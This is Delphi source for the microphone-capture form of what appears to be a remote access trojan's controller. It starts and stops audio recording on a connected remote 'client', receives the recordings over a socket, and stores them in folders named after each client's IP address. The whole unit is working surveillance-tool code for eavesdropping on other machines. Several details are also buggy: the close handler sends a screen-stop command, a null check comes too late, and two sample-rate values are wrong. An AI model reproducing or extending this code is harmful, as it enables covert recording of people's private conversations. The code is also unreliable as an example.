unit UnitMicrophone;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, StdCtrls, ComCtrls, UnitConnection, UnitUtils, UnitCommands,
  ACMConvertor, ACMOut, MMSystem, ImgList, ExtCtrls;

type
  TFormMicrophone = class(TForm)
    lbl1: TLabel;
    cbbChannel: TComboBoxEx;
    lbl2: TLabel;
    cbbSample: TComboBoxEx;
    btn1: TButton;
    lvStreams: TListView;
    stat1: TStatusBar;
    chk1: TCheckBox;
    pm1: TPopupMenu;
    P1: TMenuItem;
    S1: TMenuItem;
    N1: TMenuItem;
    D1: TMenuItem;
    O1: TMenuItem;
    il1: TImageList;
    pb1: TProgressBar;
    pnl1: TPanel;
    dlgOpen1: TOpenDialog;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure P1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure O1Click(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    ClientDatas: TClientDatas;  
    ACMO: TACMOut;           
    ACMC: TACMConvertor;
    procedure OnClientRead(Datas: string);
    procedure OnStreamTransfer(Sender: TObject; Transfered: Integer);
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; _ClientDatas: TClientDatas);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormMicrophone: TFormMicrophone;

implementation

{$R *.dfm}
 
constructor TFormMicrophone.Create(aOwner: TComponent; _ClientDatas: TClientDatas);
begin
  inherited Create(aOwner);
  ClientDatas := _ClientDatas;
end;

procedure TFormMicrophone.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormMicrophone.WndProc(var Msg: TMessage);
begin
  inherited;
  if Msg.Msg = WM_USER + 12 then OnClientRead(string(Msg.WParam));
end;

procedure TFormMicrophone.OnStreamTransfer(Sender: TObject; Transfered: Integer);
begin
  pb1.Position := pb1.Position + Transfered;
end;

procedure TFormMicrophone.OnClientRead(Datas: string);
var
  Cmd: Integer;
  TmpItem: TListItem;
  Stream: TMemoryStream;
begin
  Cmd := StrToInt(Copy(Datas, 1, Pos('|', Datas) - 1));
  Delete(Datas, 1, Pos('|', Datas));

  case Cmd of
    CMD_MICROPHONE_CAPTURE:
    begin
      pb1.Position := 0;
      pb1.Max := StrToInt(Datas);

      Stream := ClientDatas.ClientSocket.RecvStream(StrToInt(Datas), OnStreamTransfer);
      Stream.Position := 0;

      if Stream = nil then Exit;

      if chk1.Checked then ACMO.Play(Stream.Memory^, Stream.Size);

      TmpItem := lvStreams.Items.Add;
      TmpItem.Caption := TimeToStr(Time);
      TmpItem.SubItems.Add(FileSizeToStr(Stream.Size));
      TmpItem.Data := Stream;
      TmpItem.ImageIndex := 0;

      Application.ProcessMessages;
    end;

    CMD_MICROPHONE_START:
    begin                                                  
      btn1.Caption := 'Stop';
      stat1.Panels.Items[0].Text := 'Microphone capture started successfully!';
    end;

    CMD_MICROPHONE_STOP:
    begin
      btn1.Caption := 'Start';
      stat1.Panels.Items[0].Text := 'Microphone capture stopped.';
    end;
  end;
end;

procedure TFormMicrophone.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  if btn1.Caption = 'Stop' then
    ClientDatas.SendDatas(IntToStr(CMD_SCREEN_STOP) + '|'); //stop capture when closing form
end;

procedure TFormMicrophone.FormCreate(Sender: TObject);
begin
  ACMO := TACMOut.Create(nil); //initialize variables
  ACMC := TACMConvertor.Create;
  ACMO.NumBuffers := 0;
  ACMO.Open(ACMC.FormatIn);
end;

procedure TFormMicrophone.FormShow(Sender: TObject);
begin
  cbbChannel.ItemIndex := 0;
  cbbSample.ItemIndex := 0;

  //center window
  Left := (Screen.Width - Width) div 2;
  Top := (Screen.Height - Height) div 2;
end;

procedure TFormMicrophone.btn1Click(Sender: TObject);
var
  Format: tWAVEFORMATEX;
  Channel, Sample: Integer;
begin
  if btn1.Caption = 'Start' then
  begin
    case cbbChannel.ItemIndex of
      0:  Channel := 2;
      1:  Channel := 1;
    else
      ShowMessage('No channel selected.');
      Exit;
    end;

    case cbbSample.ItemIndex of
      0:  Sample := 48000;
      1:  Sample := 44100;
      2:  Sample := 22100;
      3:  Sample := 11050;
      4:  Sample := 8000;  
    else
      ShowMessage('No sample rate selected.');
      Exit;
    end;

    Format.nChannels := Channel;
    Format.nSamplesPerSec := Sample;
    Format.wBitsPerSample := 16;
    Format.nAvgBytesPerSec := Format.nSamplesPerSec * Format.nChannels * 2;
    Format.nBlockAlign := Format.nChannels * 2;
    ACMC.FormatIn.Format.nChannels := Format.nChannels;
    ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
    ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
    ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
    ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;
    
    ClientDatas.SendDatas(IntToStr(CMD_MICROPHONE_START) + '|' + IntToStr(Channel) + '|' + IntToStr(Sample) + '|');
  end
  else ClientDatas.SendDatas(IntToStr(CMD_MICROPHONE_STOP) + '|');

  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormMicrophone.P1Click(Sender: TObject);
var
  Stream: TMemoryStream;
  i: Integer;
begin
  if not Assigned(lvStreams.Selected) then Exit;
  stat1.Panels.Items[0].Text := 'Playing selected items...';

  for i := 0 to lvStreams.Items.Count - 1 do
  begin
    if not lvStreams.Items.Item[i].Selected then Continue;
    Stream := TMemoryStream(lvStreams.Items.Item[i].Data);
    ACMO.Play(Stream.Memory^, Stream.Size);
  end;

  stat1.Panels.Items[0].Text := 'Selected items played succesfully!';
end;

//Associate many file in one, by wrh1d3  //WARNING: tested only for this purpose!
procedure MergeFiles(Path: string; FileList: TStringArray; FileCount: Integer; OutFile: string);
var
  TmpStream, Stream: TMemoryStream;
  i: Integer;
begin
  TmpStream := TMemoryStream.Create;
  TmpStream.LoadFromFile(Path + '\' + FileList[0]);
  TmpStream.Position := 0;
  Stream := TMemoryStream.Create; //fill stream with first file
  Stream.CopyFrom(TmpStream, TmpStream.Size);

  for i := 1 to FileCount - 1 do //start loop with next file
  begin
    TmpStream := TMemoryStream.Create;
    TmpStream.LoadFromFile(Path + '\' + FileList[i]);
    TmpStream.Position := 0;
    Stream.Position := Stream.Size; //set position to EOS (end of stream)
    Stream.CopyFrom(TmpStream, TmpStream.Size);
  end; 

  Stream.Position := 0;
  Stream.SaveToFile(OutFile);
  Stream.Free;
end;

procedure TFormMicrophone.S1Click(Sender: TObject);
var
  Stream: TMemoryStream;
  TmpList: TStringArray;
  TmpStr: string;
  i: Integer;
begin
  if not Assigned(lvStreams.Selected) then Exit;
  stat1.Panels.Items[0].Text := 'Saving selected items...';

  //create screen capture's folder first
  if not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Microphone') then
    CreateDir(ExtractFilePath(ParamStr(0)) + 'Microphone');

  //and then for the specific client
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Microphone\' + ClientDatas.ClientSocket.RemoteAddress;
  if not DirectoryExists(TmpStr) then CreateDir(TmpStr);

  if not CreateDir(TmpStr + '\Temp') then //you will understand later...
  begin
    ShowMessage('Failed to save selected items.');
    Exit;
  end;

  for i := 0 to lvStreams.Items.Count - 1 do
  begin
    if not lvStreams.Items.Item[i].Selected then Continue;
    Stream := TMemoryStream(lvStreams.Items.Item[i].Data); //retrieve stream data...
    Stream.SaveToFile(TmpStr + '\Temp\Stream_' + IntToStr(i)); //save stream in Temp folder...
  end;

  TmpList := MyListFiles(TmpStr + '\Temp', i); //get list of saved streams and pack them
  MergeFiles(TmpStr + '\Temp', TmpList, i, TmpStr + '\' + IntToStr(GetTickCount) + '.audio');
  DeleteAllFilesAndDir(TmpStr + '\Temp'); //now delete temp folder
  
  stat1.Panels.Items[0].Text := 'Selected items saved successfully!'; //all is done!
end;
             
procedure TFormMicrophone.O1Click(Sender: TObject);
var
  Stream: TMemoryStream;
  TmpStr: string;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Microphone\' + ClientDatas.ClientSocket.RemoteAddress;
  dlgOpen1.InitialDir := TmpStr;
  dlgOpen1.DefaultExt := 'audio'; //our custom extension
  dlgOpen1.Filter := 'Audio file (*.audio)|*.audio';
  if (dlgOpen1.Execute = False) or (dlgOpen1.FileName = '') then Exit;

  stat1.Panels.Items[0].Text := 'Playing open file...';

  Stream := TMemoryStream.Create;
  Stream.LoadFromFile(dlgOpen1.FileName);
  Stream.Position := 0;
  ACMO.Play(Stream.Memory^, Stream.Size);
  Stream.Free;

  stat1.Panels.Items[0].Text := 'Open item played succesfully!';
end;

procedure TFormMicrophone.D1Click(Sender: TObject);
var
  i: Integer;
begin
  for i := lvStreams.Items.Count - 1 downto 0 do
    if lvStreams.Items.Item[i].Selected = True then lvStreams.Items.Item[i].Delete;
end;

end.
